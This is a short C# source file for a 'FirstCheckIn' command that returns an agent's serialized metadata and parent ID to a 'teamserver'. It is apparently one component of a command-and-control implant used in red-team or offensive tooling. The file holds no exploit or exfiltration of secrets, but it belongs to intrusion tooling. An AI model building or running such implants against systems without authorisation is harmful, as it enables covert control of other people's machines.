using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class FirstCheckIn : EngineerCommand
    {
        public static bool firstCheckInDone = false; 
        public override string Name => "FirstCheckIn";

        public override string Execute(EngineerTask task)
        {
            Console.WriteLine("doing first checkIN ");
            task.Arguments.TryGetValue("/parentid", out string parentId);
            return Convert.ToBase64String(Program._metadata.ProSerialise()) +"\n" + parentId; //gives back the engineers metadata and the parent so the teamserver can make the path
        }
    }
}
